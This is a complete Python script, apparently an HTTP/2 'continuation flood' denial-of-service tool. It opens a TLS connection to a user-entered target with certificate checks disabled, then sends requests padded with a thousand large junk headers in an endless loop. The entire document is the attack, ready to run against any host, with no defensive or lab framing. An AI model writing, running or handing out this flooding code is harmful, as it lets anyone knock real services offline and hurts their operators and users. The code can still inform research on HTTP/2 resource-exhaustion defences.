import socket
import ssl
from h2 import connection, config

def continuation_flood(target, port):
    sock = socket.create_connection((target, port))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(sock, server_hostname=target)

    cfg = config.H2Configuration(client_side=True)
    conn = connection.H2Connection(config=cfg)
    conn.initiate_connection()

    headers = [
        (':method', 'GET'),
        (':authority', target),
        (':path', '/'),
        (':scheme', 'https')
    ]
    headers.extend([('flood', 'X' * 1000)] * 1000)

    while True:
        conn.send_headers(conn.get_next_available_stream_id(), headers)
        sock.send(conn.data_to_send())

host = input("Enter target IP address or domain name: ")
port = int(input("Enter port: "))

continuation_flood(host, port)
